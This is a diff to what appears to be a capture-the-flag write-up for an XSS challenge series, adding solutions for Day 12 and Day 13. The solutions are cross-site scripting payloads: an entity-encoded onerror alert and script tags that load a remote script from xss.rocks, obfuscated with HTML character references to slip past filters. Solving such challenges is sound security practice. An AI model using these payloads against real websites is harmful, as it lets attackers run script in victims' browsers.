@@ -82,10 +82,18 @@ tbc
 **+++ Day 12 +++**  
 https://xmass.compass-demo.com/level12
 ```
-<img src="x" onerror="&#97&#108&#101&#114&#116&#40&#49&#41">
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+```
+alternative solution (no `alert(1)` but the script executes)
+```
+<script src=https://xss.rocks/xss.js></script>
 ```
 **+++ Day 13 +++**  
 https://xmass.compass-demo.com/level13
 ```
-tbc
+<script src="&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#120;&#115;&#115;&period;&#114;&#111;&#99;&#107;&#115;&sol;&#120;&#115;&#115;&period;&#106;&#115;"></script>
+```
+alternatively one character reference would be enough
+```
+<script src="h&#116;tps://xss.rocks/xss.js"></script>
 ```
